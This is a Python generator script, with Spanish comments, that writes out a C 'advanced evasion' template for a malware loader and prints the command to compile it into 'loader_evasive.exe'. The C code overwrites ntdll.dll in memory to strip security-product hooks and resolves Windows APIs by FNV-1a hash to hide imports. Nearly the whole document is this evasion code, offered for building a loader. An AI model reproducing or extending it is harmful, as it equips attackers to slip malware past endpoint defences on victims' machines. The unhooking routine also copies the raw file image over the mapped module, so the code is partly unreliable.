def generate_evasion_code():
    print("\n[+] Generando plantilla de evasion avanzada...")

    code = '''
// templates/evasion.c
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Reemplaza funciones hookeadas de ntdll.dll
void unhook_ntdll() {
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);

    strcat(sysdir, "\\\\ntdll.dll");

    HANDLE hFile = CreateFileA(sysdir, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD size = GetFileSize(hFile, NULL);
    BYTE *clean = (BYTE *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);

    DWORD read;
    ReadFile(hFile, clean, size, &read, NULL);
    CloseHandle(hFile);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(hNtdll, &mbi, sizeof(mbi));
    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &mbi.Protect);
    memcpy(mbi.BaseAddress, clean, size);
    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, mbi.Protect, &mbi.Protect);

    VirtualFree(clean, 0, MEM_RELEASE);
}

// API hashing (FNV-1a ejemplo)
DWORD hash_fnv1a(const char *str) {
    DWORD hash = 0x811c9dc5;
    while (*str) {
        hash ^= *str++;
        hash *= 0x01000193;
    }
    return hash;
}

// Resolución de función por hash
FARPROC resolve_api(HMODULE hMod, DWORD target_hash) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exports->AddressOfNames);
    WORD *ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *func_name = (char *)(base + names[i]);
        DWORD h = hash_fnv1a(func_name);
        if (h == target_hash) {
            WORD ord = ordinals[i];
            return (FARPROC)(base + functions[ord]);
        }
    }
    return NULL;
}
'''

    with open("templates/evasion.c", "w") as f:
        f.write(code.strip())

    print("[+] Plantilla generada: templates/evasion.c")
    print("[+] Compilas: x86_64-w64-mingw32-gcc core/loader.c templates/evasion.c -o loader_evasive.exe -O2")


